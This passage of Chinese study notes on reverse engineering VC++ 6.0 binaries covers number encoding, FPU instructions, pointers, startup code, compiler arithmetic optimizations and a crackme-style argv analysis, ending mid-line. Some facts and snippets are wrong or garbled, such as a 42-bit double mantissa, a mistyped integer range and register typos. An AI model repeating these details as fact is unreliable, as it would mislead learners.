int，变量在内存中占4字节，0x00000000~0xffffffff，十进制表示 0~4294967295。无符号整型不足32位时，用0填充剩余高位。相当于 dword。\n\n### 2.1.2 有符号整数\n\n​\t最高位表示符号位。0正1负，内存中占4字节，0x80000000~0x7fffffff，十进制 -2147483648~2147483647。其中正数区间 0x00000000~0x7ffffffff，负数区间 0x80000000~0xffffffff。\n\n​\t负数在内存中以补码方式存放，简单表示为**用0减去这个数绝对值**或者**该数取反加1**。\n\n​\t有符号整数都是以补码形式存储的，因为计算机只会做加法，要把减法转加法。查看用16进制表示的最高位，小于8为正数，否则为负数。判断一段数据时有符号类型还是无符号类型需要查看指令或已知函数如何操作此内存地址，根据操作方式或函数相关定义的出地址数据类型。\n\n> ​\t有符号和无符号在计算机中存储完全一样，只在类型转换——比较大小和数学运算中有区别，若不指明无符号(unsigned)变量则编译器默认为有符号(signed)变量。\n\n\n\n## 2.2 浮点数类型\n\n​\t使用**指数域**、**数据域**和**符号域**进行运算后得到真值。\n\n### 2.2.1 浮点数编码方式\n\n#### float IEEE 编码\n\n占4字节，最高位符号位，8位表示指数，其余表示尾数\n\n[![s8jl2q.png](https://s3.ax1x.com/2021/01/11/s8jl2q.png)](https://imgchr.com/i/s8jl2q)\n\n转换步骤：\n\n1. 先将这个实数的绝对值化为二进制格式\n2. 将这个二进制格式实数的小数点左移或右移n位，直到小数点移动到第一个有效数字的右边\n3. 从小数点右边第一位开始数出二十三位数字放入第22到第0位\n4. 如果实数是正的，则在第31位放入“0”，否则放入“1”。\n5. 如果n 是左移得到的，说明指数是正的，第30位放入“1”。如果n是右移得到的或n=0，则第30位放入“0”\n6. 如果n是**左移**得到的，则将n减去1后化为二进制，并在左边加“0”补足七位，放入第29到第23位；如果n是**右移**得到的或n=0，则将n化为二进制后在左边加“0”补足七位，再各位求反，再放入第29到第23位\n\n12.25f -> 1100.01\n\n小数点移动至最高位为1处，左移动三次 -> 1.10001，指数部分为3。（左移指数部分第一位填1；右移指数部分第一位填0）\n\n为正数，符号位添0。转换情况如下\n\n```\n符号位：0\n指数位 3+127 -> 10000010 //大于127表示是一个正数 1（3-2：0000010）\n尾数位：10001 00000...（共23位）\n0100 0001 0100 0100 0000 0000 0000 0000\n41440000\n```\n\n[![sWvRhV.png](https://s3.ax1x.com/2021/01/20/sWvRhV.png)](https://imgchr.com/i/sWvRhV)\n\n-0.125f -> 0.001 右移三次(指数位第一位0) -> 1.0，指数减一：-3-1=-4(0xFC)=(11111100)\n\n```\n符号位：1\n指数位 -3+127 -> 01111100 //小于127表示是一个负数\n尾数位：00000 00000...（共23位）\n1011 1110 0000 0000 0000 0000 0000 0000\nBE000000\n```\n\n[![sWvQSO.png](https://s3.ax1x.com/2021/01/20/sWvQSO.png)](https://imgchr.com/i/sWvQSO)\n\n#### double\n\n占8字节，最高位表示符号，指数位占11位，剩42位用于表示尾数。指数位计算需要加1023\n\n### 2.2.2 浮点数指令\n\n​\t浮点数操作通过浮点寄存器来实现，普通数据类型是通用寄存器，分别使用两套指令。\n\n​\t浮点数寄存器通过栈结构实现，由 ST(0) ~ ST(7) 共8个栈空间组成，每个浮点数占8字节。先使用 ST(0)，不能跨越使用。使用过程就是压栈、出栈过程。ST(0) 存在数据时，压栈后，数据将装入 ST(1) 中，如无出栈，则按顺序压栈，知道浮点寄存器占满。IN 表示操作数入栈，OUT 表示操作数出栈。\n\n[![sGP28g.png](https://s3.ax1x.com/2021/01/11/sGP28g.png)](https://imgchr.com/i/sGP28g)\n\n其他指令和普通指令类似，只需前面加 F\n\n使用浮点指令时，先利用 ST(0) 进行运算。\n\n- ST(0) 中有值时，将 ST(0) 中的数据顺序向下存放到  ST(1) 中，然后再将数据放入 ST(0) 中。\n- 再次操作 ST(0) ，会先将 ST(1) 中的数据放入 ST(2) 中，将 ST(0) 中数据 放入 ST(1) 中，\n- 最后才将新的数据存放到 ST(0) 。以此类推\n\n若8个浮点寄存器都有值情况下继续向 ST(0) 中存放数据，这是会丢弃 ST(7) 中的数据。\n\n```asm\n;浮点数作为返回值\nfFloat = GetFloat();\ncall GetFloat\n;使用浮点寄存器 ST(0) 作为返回值\nfst dword ptr [ebp-4]\n;...\nfloat GetFloat()\n{\n\treturn 12.25f;\n\t;使用 ST(0) 作为返回值进行传递\n\tfld dword ptr [12.25f地址]\n\tret\n}\n```\n\n## 2.5 地址、指针和引用\n\n- 地址：取一个变量地址使用 & 符号，只有变量才存在内存地址。\n- 指针：定义用 TYPE*，TYPE 作为数据类型，任何数据都可以定义指针。指针本身也是一种数据类型，用于保存各种数据类型在内存中地址。\n- 引用：TYPE&，不可单独定义，定义时需初始化。表示一个变量的别名。\n\n### 2.5.1 指针和地址\n\n​\t在**32位操作系统**下，地址是32位二进制数字组成的值，转换成十六进制数字进行显示，用于标识内存编号。指针用于保存这个编号的一种变量类型，包含在内存中，可以取出指针类型变量在内存中的位置，也就是地址。指针保存的数据都是地址，**无论什么类型指针都占据4字节**。赋值带*类型变量只能使用完整写法（指明类型）。\n\n​\t指针变量可以加减，但不能乘除。做加减时\n\n```\n指针变量 +(-) N = 指针变量 +(-) N*(指针变量类型宽度)\n```\n\n```\n指针变量 - 指针变量 = 相减结果 / 指针变量类型宽度 （类型需相同）\n```\n\n### 2.5.2 指针工作方式\n\n​\t指针用类型作为修饰的原因是需要用类型去解释这个地址中的数据。每种数据类型在内存中占的内存空间不同，指针只保存了存放数据的首地址，这时就需要对应类型来寻找解释数据的结束地址。不同类型指针访问同一地址，取出的内容会不一样。\n\n```c\nint nVar=0x12345678;\n\tmov dword ptr [epb-10h], 12345678h\n//定义 int 类型指针变量，初始化为 nVar 地址\nint *pnVar = &nVar;\n\tlea ecx, [epb-10h]\n\tmov dword ptr [ebp-14h], ecx\n//定义 char 类型指针变量，初始化为 nVar 地址\nchar *pcVar = &nVar;\n\tlea edx, [epb-10h]\n\tmov dword ptr [ebp-18h], ecx\n//取出 pnVar 指向地址内容并显示\nprintf(\"%08x \\r\\n\", *pnVar);\n\tmov ecx, dword ptr [ebp-14h] //保存指针保存的地址值放入 ecx\n    mov edx, dword ptr [ecx]\t//以4字节方式读取ecx中数据，放入edx\n//调用忽略\n\nprintf(\"%08x \\r\\n\", *pcVar);\n\tmov eax, dword ptr [ebp-18h]\t//取指针指向地址值放入eax，movsx为带符号扩展移动\n    movsx ecx, byte ptr [eax]\t\t//以1字节方式读取数据，放入ecx\n//调用忽略\n```\n\n12345678h 在内存中数据形式为 `78 56 34 12`，首地址从 78 开始。输出结果如下：\n\n```\n12345678\n00000078\n```\n\n​\t\n\n指针加法用于地址偏移，指针加1后，具体值取决于指针类型，如指针类型为 int，地址值将会加4。偏移为负数，表示指针向后寻址。此时指针做减法操作。\n\n具体指针寻址公式如下：\n\n```c\ntype* p;\t//用 type 泛指某类型指针\np + n 的目的地址 = 首地址 + sizeof(指针类型type) * n\n```\n\n```c\nint arr[2][5];\nint *p1[5]; //定义一个指针数组\t宽度为 20 byte\nint (*p2)[5]; //定义一个数组指针\t宽度为 4 byte\n\np2 = (int (*)[5])arr;\np2 = &arr;\t\t\t\t//将 p2 指向 arr\n```\n\n本质：\n\n1. 指针是一个带*的类型\n2. 宽度永远是4\n3. ++--，加减数值看砍掉一个*看宽度\n4. 可加减一个数\n5. 可比较大小\n6. 指针之间可加减，结果还要除以宽度\n\n```c\nint Func(int x, int y)\n{}\nint main()\n{\n    int (*pFun)(int,int);//这种方式一般用来已知函数地址来调用别人定义的函数\n    //pFun = (int (*)(int, int))10;\n    //pFun++;\t\t//该句无法编译\n    pFun = (int (*)(int, int))Func;\n    pFun = Func;\n}\n```\n\n\n\n### 2.5.3 引用\n\n& 可以取任何一个变量的地址，&a 的类型就是 a类型+* \n\n引用类型就是指针类型，不过用于存放地址的内存空间对使用者是隐藏的。\n\n```c\nint nVar = 0x12345678;\n\tmov dword ptr [ebp-4],12345678h\nint &nVarTpye = nVar; //定义变量 nVar 的引用类型 nVarTpye\n\tlea eax, [ebp-4]\n\tmov dword ptr [ebp-8], eax\t//变量nVar存入ebp-8中，也就是nVarType 的地址\nAdd(nVar);\n\tlea ecx, [ebp-4]\t\n\tpush ecx\t\t//nVar作为参数入栈\n\tcall Add\n\tadd esp, 4\n\t\nvoid Add(nVar)\n{\n    nVar++;\n        //对 eax 执行取内容操作\n    \tmov eax, dword ptr [ebp+8];\t//将参数赋予 eax\n        mov ecx, dword ptr [eax];\n        add ecx, 1;\n        mov edx, dword ptr [ebp+8];\n        mov dword ptr [edx], ecx;\n        ret;\n}\n```\n\n通过对参数加1方式修改实参数据，引用类型的参数也占用内存空间，保存的数据是一个地址值。驱虎这个地址中的数据并加1，再将结果放回。反汇编没有引用这种数据类型。\n\n## 2.6 常量\n\n​\t常量数据在程序运行前就已经存在，他们被编译到可执行文件中。程序启动后，这些数据通常会在常量数据区中保存，该区域的属性是没有可写权限的，对产量进行修改时，程序会报错或者崩溃。\n\n### 2.6.1 常量的定义\n\n​\t可用宏机制  #define 来定义变量，也可用 const 将变量定义为一个常量。编译器对 #define 进行编译时，将代码的宏名称替换成为对应信息。const 是为了增加程序的健壮性而存在的。常用字符串处理函数 strcpy 的第二个参数被定义为一个常量，防止该参数在函数内被修改。\n\n```c\nchar *strcpy(char *dest, const char *src)\n```\n\n### 2.6.2 #define 和 const 区别\n\n​\t#define 是一个真常量，由系统判断是否被修改，const 是由编译器判断实现的常量，是一个假常量。使用 const 定义的变量最终还是一个变量，只是在编译器内进行检查，有修改则报错。利用指针获取到 const 修饰果的变量地址，去掉 const 修饰，就可以修改数据内容。\n\n​\t两者连接生成可执行文件后不存在，二进制编码中也没有这两种类型的存在，实际分析中，根据经验还原。\n\n\n\n# 0x03 启动函数\n\n## VC++ 6.0 启动函数\n\n​\tVC++ 6.0 在控制台和多字节编码环境下的启动函数为 mainCRTStartup，由 KERNEL32.dll 负责调用。在 mainCRTStartup 中再调用 main函数。调试时入口断点总是停留在 main 函数首地址处。\n\n- GetVersion：获取当前运行平台版本号。控制台运行在 Windows 模拟的 DOS 下，因此这里获取版本号为 MS-DOS 的版本信息。\n\n- _heap_init 函数：用于初始化堆空间。在函数实现使用 HeapCreate 申请堆空间。\n\n- GetCommandLineA ：获取命令行参数信息的首地址。\n\n- _crtGetEnvironmentStringA：获取环境变量信息首地址。\n\n- _setargv：根据GetCommandLineA 获取命令行参数信息的首地址并进行参数分析，将分离出的参数的个数保存在全局变量 _argc 中，将分析出的每个命令行参数的首地址放在数组中，数组的首地址保存在全局变量 _argv 中。获取命令行参数个数，和参数信息。\n\n  ​\t得到 main 函数三个参数后，调用 main 函数，将 _ argc、_ argv、env 三个全局变量作为参数，通过栈传参方式传递到 main 函数中\n\n- _setenvp：此函数根据 _crtGetEnvironmentStringA 函数获取环境变量信息的首地址进行分析，得到的每条环境变量字符串的首地址存放在字符指针数组中，并将这个数组的首地址存放在全局变量 env 中。\n\n- _cinit ：用于全局数据和浮点寄存器的初始化。\n\n默认情况，入口函数为 main，从 mainCRTStartup 启动，最后调用 main 函数，重新指定入口函数后，直接从 KERNEL32.dll 调用重新指定的入口函数，不经过 mainCRTStartup。\n\n## 3.3 main函数识别\n\n​\t在控制台程序中，如果看到 GetVersion() 或者 GetCommandLineA()（在 OD 中一般能识别出来），之后向下再找需要三个参数的函数一般就是 main 函数。\n\n\n\n# 0x04 表达式求值过程\n\n## 4.1 算术运算和赋值\n\n​\tVC++6.0 钟算术运算与其他传递计算结果的代码组合后才能被视为一条有效的语句。单独的算术运算可以编译通过，但是并不会生成代码。\n\n### 4.1.1 算数运算工作形式\n\n#### 1. 加法\n\n Add，针对不同操作数，转换的指令也会不同，编译器会根据优化反射光hi选择最佳匹配方案。\n\n- O1 生成文件占用空间最小\n- O2 执行效率最快\n\n​\tVC++ 6.0 Release 编译选项组默认 02 选项。在 Debug 编译选项组钟，使用 Od+ZI 选项，此选项使编译器产生的一切代码都以便于调试为前提，在不影响调试的前提下尽可能优化。使用 Debug 编译选项组时，VC++产生的目标汇编代码和源码时一一对应的。\n\n```\nDebug 版本：\n /MDd /MLd 或 /MTd   使用 Debug runtime library(调试版本的运行时刻函数库)\n /Od                 关闭优化开关\n /D \"_DEBUG\"         相当于 #define _DEBUG,打开编译调试代码开关(主要针对\n                     assert函数)\n /ZI                 创建 Edit and continue(编辑继续)数据库，这样在调试过\n                     程中如果修改了源代码不需重新编译\n /GZ                 可以帮助捕获内存错误\n /Gm                 打开最小化重链接开关，减少链接时间\nRelease 版本：\n /MD /ML 或 /MT      使用发布版本的运行时刻函数库\n /O1 或 /O2          优化开关，使程序最小或最快\n /D \"NDEBUG\"         关闭条件编译调试代码开关(即不编译assert函数)\n /GF                 合并重复的字符串，并将字符串常量放到只读内存，防止\n                     被修改\n```\n\n三种操作数加法运算\n\n```c\n15+20 无效语句，不参与编译\n\nint nVarOne = 0;\nint nVarTwo = 0;\n\tmov dword ptr [ebp-4], 0\n\tmov dword ptr [ebp-8], 0\n\n//两常量相加\nnVarOne = 1+2;\t//编译器就计算出两常量相加后的结果，作为立即数参与运算\n\tmov dword ptr [ebp-4], 3\n\n//变量加常量\nnVarOne = nVarOne + 1;\t//取出内存数据放入通用寄存器zhong\n\tmov eax, dword ptr [ebp-4]\n\tadd eax, 1\n\tmov dword ptr [ebp-4], eax\n\n//两变量相加\nnVarOne = nVarOne + nVarTwo\n\tmov ecx, dword ptr [ebp-4]\n\tadd ecx, dword ptr [ebp-8]\n\tmov dword ptr [ebp-4], ecx\n```\n\n开启 O2 选项后，编译器会将无用代码取去除，将合并代码进行归并处理。\n\n##### 常量传播\n\n​\t将编译器间可计算出结果的变量转换成常量，减少了变量的使用\n\n```c\nvoid main(){\n    int nVar = 1;\n    printf(\"%d \\r\\n\", nvar);\n}\n```\n\nnVar 是一个在编译期间可以计算出结果的变量。在程序中所有引用到 nVar 的地方都会直接使用常量 1 来代替：\n\n```c\nvoid main()\n{\n    printf(\"%d \\r\\n\", 1);\n}\n```\n\n##### 常量折叠\n\n计算公式出现多个常量进行计算的情况时，且编译器可在编译期间计算出结果时，这样源代码中所有的变量都将被计算结果代替：\n\n```c\nvoid main()\n{\n    int nVar = 1 + 5 - 3 * 6;\n    printf(\"%d \\r\\n\", nVar);\n}\n```\n\n1 + 5 - 3 * 6 的值可以是在编译过程中计算出来的，首先会计算 1 + 5 - 3 * 6 结果，然后直接将数值替换掉原表达式：\n\n```c\nvoid main(){\n    int nVar = -12;\n    printf(\"%d \\r\\n\", nVar);\n}\n```\n\n优化如下\n\n```c\nint main(int argc, char* argv[]) {\n\t//int nVarOne = argc;\n\t//int nVarTwo = argc;\n\t//nVarOne = nVarOne + 1;\n\t//nVarOne = 1 + 2；\n\t//nVarOne = nVarOne + nVarTwo;\n\tprintf(\"%d \\r\\n\", 3+argc);\n\treturn 0;\n}\n```\n\n#### 2. 减法\n\n​\tsub，通过补码转换将减法转变为加法形式完成。\n\n> 设二进制数 Y，8位\n>\n> Y + Y_i = 1111 1111B\n>\n> Y  + Y_i + 1 = 0 (进位丢失)\n>\n> Y_i + 1 = 0 - Y <==> Y_i + 1 = -Y <==> Y补 = -Y\n\n减法转换\n\n```c\nint nVarOne = argc;\nint nVarTwo = 0;\n//获取 nVarTwo 数据，使用 scanf 防止变量被常量化\nscanf(\"%d\", &nVarTwo);\n// 变量-常量\nnVarOne = nVarOne - 100;\n\tmov eax, dword ptr [ebp-4];\n\tsub eax, 64h;\n\tmov dword ptr [ebp-4], eax;\n//加减法混合\nnVarOne = nVarOne + 5 - nVarTwo;\t//自左向右顺序依次执行\n\tmov ecx, dword ptr [ebp-4];\n\tadd ecx, 5;\n\tsub ecx, dword ptr [ebp-8];\n\tmov dword ptr [ebp-4], ecx\nprintf(\"%d \\r\\n\", nVarOne);\n```\n\n​\t实际分析中，根据加法操作数的情况，当加数为负数时，执行的时减法操作。\n\n#### 3. 乘法\n\n有符号 imul 和无符号 mul 两种。由于乘法指令的执行周期较长，在编译过程中，编译器会先将乘法转换成加法，或使用位移等周期较短的指令。都不可转换时，才会使用乘法指令。\n\n```c\n//乘法转换 Debug 版\nint nVarOne = argc;\nint nVarTwo = argc;\n\n//变量乘常量（非 2 的幂\nprintf(\"%d\", nVarOne * 15);\n\tmov edx, dword ptr [ebp-4];\n\timul edx, edx, 0Fh;\n\n//变量乘常量（ 2 的幂\nprintf(\"%d\", nVarOne * 16);\n\tmov eax, dword ptr [ebp-4];\n\tshl eax, 4;\t\t//左移代替乘法\n\n//两常量相乘\nprintf(\"%d\", 2*2);\t//编译期间计算2*2结果，转换为常量值\n\tpush 4;\n\tpush offset string \"%d\";\n\tcall printf;\n\tadd esp, 8;\n\n//混合运算\nprintf(\"%d\", nVarTwo * 4 + 5);\n\tmov ecx, dword ptr [ebp-8];\n\tlea edx, [ecx*4+5];\n\n//两变量相乘\nprintf(\"%d\", nVarOne * nVarTwo);\n\tmov ecx, dword ptr [ebp-4];\n\timul ecx, dword ptr [ebp-8];\n```\n\n​\t乘数和被乘数都是未知变量时，无法套用优化方案，编译器不会优化处理。\n\n#### 4. 除法 （不太会，有待深化）\n\n​\t有符号 idiv 和无符号 div 两种。执行周期较长，周期较低。C++ 中除法运算不保留余数。两个无符号整数相除，结果时无符号的；两个有符号整数相除，结果是有符号的；有符号和无符号混除，结果是无符号的，有符号数最高位作为数据位对待，作为无符号数参与计算。\n\n​\t计算机取整数有向下取整、向上取整和向零取整。\n\n​\tVC++ 对除数为整数常量的除法处理：如果除数是变量，只能用除法指令。除数为常量，可优化。\n\n```c\nint nVarOne = argc;\nint nVarTwo = argc;\n\tmov eax, dword ptr [ebp+8];\n\tmov dword ptr [ebp-4], eax;\n\tmov ecx, dword ptr [ebp+8];\n\tmov dword ptr [ebp-8], ecx;\n\n//两变量做除法\nprintf(\"%d \\r\\n\", nVarOne/nVarTwo);\n\tmov eax, dword ptr [ebp-4];\n\tcdq; //扩展高位; 把eax高位复制到edx上，构成64 bit 数据\n\tidiv eax, dword ptr [ebp-8];\n\n//变量除以常量，2的一次方\nprintf(\"%d \\r\\n\", nVarOne / 2);\n\tmov eax, dword ptr [ebp-4];\n\tcdq;\n\tsub eax, edx; //减去扩展高位\n\tsar eax, 1; //除法右移\n\n//变量除以常量，非2的次方\nprintf(\"%d \\r\\n\", nVarTwo / 7);\n\tmov eax, dword ptr [ebp-8];\n\tcdq;\n\tmov ecx, 7;\n\tidiv eax, ecx;\n\n//变量对非2的幂取模\nprintf(\"%d \\r\\n\", nVarTwo % 7);\n\tmov eax, dword ptr [ebp-8];\n\tcdq;\n\tmov ecx, 7;\n\tidiv eax, ecx;\n\tpush edx;\t\t//余数保存再扩展位 edx 中\n\n//变量除以常量，2的3次幂\nprintf(\"%d \\r\\n\", nVarOne / 8);\n\tmov eax, dword ptr [ebp-4];\n\tcdq;\n\tand edx, 7;\t//若eax为负数，则edx为0xFFFFFFFF，edx = 7，反之为0\n\tadd eax, edx;\n\tsar eax, 3;\n```\n\n\n\n### 4.1.2 算术结果溢出\n\n​\t4 字节 32 位内存空间的数据经过运算后，得到的结果超出了存储空间的大小，就会产生溢出现象。如 int 类型数据 0xFFFFFFFF 加2得到的记过会超出 int 类型存储范围，也称为溢出数据，无法存储将会丢失。\n\n[![sdyLL9.png](https://s3.ax1x.com/2021/01/14/sdyLL9.png)](https://imgchr.com/i/sdyLL9)\n\n进位：无符号整数超出存储范围叫做进位。因为没有符号位，不会破坏数据，多出的1位数据会被进位标志位 CF 保存，数据产生了进位，只是进位后的1位数据1不在自身存储空间。可查看 CF，检查数据是否进位。\n\n溢出：有符号数超出存储范围叫做溢出，由于数据进位，从而破坏了有符号数的最高位——符号位。可查看溢出标志位 OF，检查数据是否溢出。如果参与加法运算的数值符号一致，计算结果符号不同，则判定 OF 成立，其他不成立。\n\n​\t其他操作也会导致溢出或进位。\n\n### 4.1.3 自增和自减\n\n++、-- 来实现自增和自减。\n\n```c\nint nVarOne = argc;\nint nVarTwo = argc;\n\nnVarTwo = 5 + (nVarOne++);\n\tmov edx, dword ptr [ebp-4];\n\tadd edx, 5;\n\tmov dword ptr [ebp-8], edx;\n\tmov eax, dword ptr [ebp-4];\n\tadd eax, 1;\n\tmov dword ptr [ebp-4], eax;\n\nnVarTwo = 5 + (++nVarOne);\n\tmov ecx, dword ptr [ebp-4];\n\tadd ecx, 1;\n\tmov dword ptr [ebp-4], ecx;\n\tmov edx, dword ptr [ebp-4];\n\tadd edx, 5;\n\tmov dword ptr [ebp-8], edx;\n```\n\n## 4.2 关系运算和逻辑运算\n\n​\t关系运算用于判断两者之间关系，比较关系运算符两边的操作数的值，得出一个判断结果：真或假。\n\n​\t逻辑运算符用于判定两个逻辑值之间的依赖关系，与或非。\n\n### 4.2.1 关系运算和条件跳转的对应\n\n[![sdgoJP.png](https://s3.ax1x.com/2021/01/14/sdgoJP.png)](https://imgchr.com/i/sdgoJP)\n\n[![sd2AeJ.png](https://s3.ax1x.com/2021/01/14/sd2AeJ.png)](https://imgchr.com/i/sd2AeJ)\n\n这些指令与 cmp 和 test 匹配出现，但条件跳转指令检查的是标积位。\n\n### 4.2.2 表达式短路\n\n​\t表达式短路通过逻辑与运算和逻辑或运算使语句根据条件在执行时发生中断，从而不执行后面语句\n\n```c\nint Accumulation(int nNumber){\n    nNumber && (nNumber += Accumulation(nNumber-1));\n    \tcmp dword ptr [ebp+8], 0;\t//nNumber 是否为0\n    \tje Accumulation+35h;\n    \tmov eax, dword ptr [ebp+8];\n    \tsub eax, 1;\n    \tpush eax;\n    \tcall Accumulation;\t//返回值在eax中\n    \tadd esp, 4;\t\t\t//平衡栈\n    \tmov ecx, dword ptr [ebp+8];\n    \tadd ecx, eax;\n    \tmov dword ptr [ebp+8], ecx;\n    return nNumber;\n    \tmov eax, dword ptr [ebp+8];\n}\n```\n\n​\t以上选择了 && 来制造递归函数出口，通过 cmp 检测左边语句是否为假值，根据跳转指令 JE 决定是否跳过程序流程。nNumber 为假时，跳过递归调用，程序执行到 return 处。\n\n```c\n(nNumber==1) || (nNumber += Accumulation(nNumber-1));\n```\n\n若改成以上判定，也会产生相同的汇编代码，虽然使用的逻辑运算符不同。\n\n### 4.2.3 条件表达式\n\n```\n表达式 1 ? 表达式 2: 表达式 3\n```\n\n表达式1为真，选择表达式2，否则执行表达式3。当2和3都为常量时，条件表达式可被优化；当2或3中的一个为变量时，条件表达式不可优化，会转换成分支结构。当1为一个常量值时，编译期间就能得到答案，将不会存在条件表达式。方案如下\n\n1. 1比较简单，2和3两者差值等于1；\n2. 1比较简单，2和3两者差值大于1；\n3. 1比较复杂，2和3两者差值大于1；\n4. 2和3有一个为变量，无忧化。\n\n```c\n//1\nint Condition(int argc, int n){\n\treturn argc == 5 ? 5:6;\n    \txor eax, eax;\n    \tcmp dword ptr [ebp+8], 5;\n    \tsetne al;\t//setne 检查 ZF 标志位，ZF==1时，al为0，反之为1\n    \tadd eax, 5;\n}\n```\n\n2和3差值为1，用 setne 指令进行平衡。\n\n```c\n//2\nint Condition(int argc, int n){\n\treturn argc == 5 ? 4:10;\n    \tmov eax(reg), dword ptr [ebp+8];\n    \tsub eax, 5(A);\n    \tneg eax;\t\t//求补, 目的操作数为0，CF置为0；非0，CF置1.\n    \tsbb eax, eax;\t//带位减法 = eax-eax-CF\n    \t//此时 eax 只能为0或0xFFFFFFFF\n    \tand eax, 6(B);\n    \tadd eax, 4(C);\t//等值条件成立，结果为C，否则 B+C\n}\n```\n\n等值比较使用减法和求补运算来判断是否为真值，argc 不为5，sub 指令后就不为0；接下来执行 neg 指令，eax 的符号位就会发生改变，CF 置1。sbb 执行后 eax 只能为0xFFFFFFFF，否则为 0。上述代码块可直接还原为\n\n```c\nreg == A ? C : B+C;\n```\n\n```c\n//3\nint Condition(int argc, int n){\n    return argc <= 8 ? 4:10;\n    \txor eax, eax;\t\t\n    \tcmp dword ptr [ebp+8], 8;\n    \tsetg al;\t//检查数据是否大于(有符号大于)8，大于则赋al=1，否则0\n    \tdec eax;\t//0 or 0xFFFFFFFF（0或-1）\n    \tand al, 0FAh;\t//0 or 0xFFFFFFFA\n    \tadd al, 0Ah;\t//Ah or 4\n}\n```\n\n​\t重点考察 and 前的指令，以辩别真假逻辑的处理方式。\n\n```c\n//4\nint COndition(int argc, int n){\n    return argc ? 8:n;\n    \tcmp dword ptr [ebp+8], 0;\n    \tje Condition+27h;\n    \tmov dword ptr [ebp-4], 8;\t//表达式1存入局部变量ebp-4中\n    \tjmp Condition+2Dh;\n   +27h:mov eax, dword ptr [ebp+0Ch];\t//参数2数据入栈\n    \tmov dword ptr [ebp-4], eax;\n   +2Dh:mov eax, dword ptr [ebp-4];\n}\n```\n\n## 4.3 位运算\n\n```c\n//有符号位运算说明\nint BitOperation(int argc){\n    argc = argc << 3;\n    \tmov eax, dword ptr [ebp+8];\n    \tshl eax, 3;\n    \tmov dword ptr [ebp+8];\n    argc = argc >> 5;\n    \tmov ecx, dword ptr [ebp+8];\n    \tsar ecx, 5;\n    \tmov dword ptr [ebp+8], ecx;\n    argc = argc | 0xFFFF0000;\n    \tmov edx, dword ptr [ebp+8];\n    \tor edx, 0xFFFF0000;\n    \tmov dword ptr [ebp+8], edx;\n    argc = argc & 0x0000FFFF;\n    \tmov eax, dword ptr [ebp+8];\n    \tand eax, 0x0000FFFF;\n    \tmov dword ptr [ebp+8], eax;\n    argc = argc ^ 0xFFFF0000;\n    \tmov ecx, dword ptr [ebp+8];\n    \txor ecx, 0xFFFF0000;\n    \tmov dword ptr [ebp+8], ecx;\n    argc = ~argc;\n    \tmov edx, dword ptr [ebp+8];\n    \tnot edx;\n    \tmov dword ptr [ebp+8], edx;\n    return argc;\n}\n```\n\n```c\n//无符号数位移\nint BitOperation(int argc){\n    unsigned int Vnar = argc;\n    \tmov eax, dword ptr [ebp+8];\n    \tmov dword ptr [ebp-4], eax;\n    nVar <<= 3;\n    \tmov ecx, dword ptr [ebp-4];\n    \tshl ecx, 3;\t//和有符号左移一样\n    \tmov dword ptr [ebp-4], ecx;\n    nVar >>= 5;\n    \tmov edx, dword ptr [ebp-4];\n    \tshr edx, 5;\t//使用 shr 右移，最高位补 0，最低为进 CF\n    \tmov dword ptr [ebp-4], edx\n}\n```\n\n​\t位运算可用于加密，运算，内存确认等操作。也可以用于加壳的运用中，如把要执行的代码取非，在程序运行前再做一次取非操作程序即可正常运行。\n\n### 1、算数位移指令\n\n指令格式：SAL/SAR Reg/Mem, CL/Imm\t\t\t\t\nSAL(Shift Arithmetic Left): 算术左移\t\t\t\t\nSAR(Shift Arithmetic Right): 算术右移\t\t\n\n[![sLWAZd.png](https://s3.ax1x.com/2021/01/25/sLWAZd.png)](https://imgchr.com/i/sLWAZd)\n\n```asm\nSAL eax,1\t\t\t10000001\t\t0000 0010\nSAL ax,1\t\t\t 0x81\t\t\nSAL al,1\t\t\t\t\t\n\t\t\tCF:1\t\t0x02\n\t\t\t\t\t\nSAR\t\t\t0x81\t\t\n\t\t\t1000 0001 == 1100 0000\n\t\t\t\t\t\t\t0xC0\n\t\t\tCF = 1\t\t\n\n```\n\n### 2、逻辑移位指令\n\n指令格式：SHL/SHR Reg/Mem, CL/Imm\t\t\t\nSHL(Shift Left):      逻辑左移\t\t\t\nSHR(Shift Right):      逻辑右移\t\t\n\n[![sLflp6.png](https://s3.ax1x.com/2021/01/25/sLflp6.png)](https://imgchr.com/i/sLflp6)\t\n\n### 3、循环移位指令\n\n指令格式：ROL r/m, i8  ROR r/m, CL\nROL(Rotate Left):        循环左移\t\t\t\nROR(Rotate Right):       循环右移\t\t\n\n[![sLf6BQ.png](https://s3.ax1x.com/2021/01/25/sLf6BQ.png)](https://imgchr.com/i/sLf6BQ)\n\n```asm\nrol al,0x81\t\t\t1000 0001\n```\n\n### \t4、带进位的循环移位指令\n\n指令格式：RCL r/m, i8  RCR r/m, CL\nRCL(Rotate through Carry Left):  带进位循环左移\nRCR(Rotate through Carry Right): 带进位循环右移\n\n[![sLhYvT.png](https://s3.ax1x.com/2021/01/25/sLhYvT.png)](https://imgchr.com/i/sLhYvT)\n\n\n\n## 4.5 实例分析\n\nmain 函数分析\n\n[![srFeCF.png](https://s3.ax1x.com/2021/01/16/srFeCF.png)](https://imgchr.com/i/srFeCF)\n\n对数组 charNumber14 每一项进行赋值，对命令行参数 argv[1] 进行一些计算，推测对输入参数进行加密运算，翻译为 C++ 如下：\n\n```c\nchar Number14 = [119, 118, 202, 243, 168, 12, 1, 1, 254, 219, 1, 224, 251, 0];\n```\n\n继续往下分析，以下也为 argv[1] 加密部分\n\n[![sruuvT.png](https://s3.ax1x.com/2021/01/16/sruuvT.png)](https://imgchr.com/i/sruuvT)\n\n[![sru3VJ.png](https://s3.ax1x.com/2021/01/16/sru3VJ.png)](https://imgchr.com/i/sru3VJ)\n\n加密结束后，与charNumber进行对比运算，还原加密算法：\n\n```c\nvoid main(int argc, char* argv[], char *envp)\n{\n    argv[1][0] |= argc - 1;\n    argv[1][1] ^= argc - 1;\n    argv[1][2] *= (argc - 1) * 6;\n    argv[1][3] = argv[1][2] / 4;\n    argv[1][4] <<= 3;\n    argv[1][5] >>= 2;\n    argv[1][6] &=  7 & (argc - 1);\n    argv[1][7] %= 2;\n    argv[1][8] = -(argc - 1);\n    char *pargv9 = argv[1][9];\n    *pargv9 += argv[1][0] - argv[1][2];\n    pargv9 += 1;\n    pargv9 += 1;\n    *(pargv9-1) = argv[1][6] / argv[1][7];\n    *pargv9 += argv[1][3] - argv[1][1];\n    *(short)pargv9 = argv[1][5] * argv[1][4]; //改变argv[1][11]和argv[1][12]\n}\n```\n\n\n\n# 0x05 流程控制语句\n\n## 5.1 if\n\n```c\nif(argc == 0){\n    \tcmp dword ptr [ebp+8], 0;\n\t\tjne 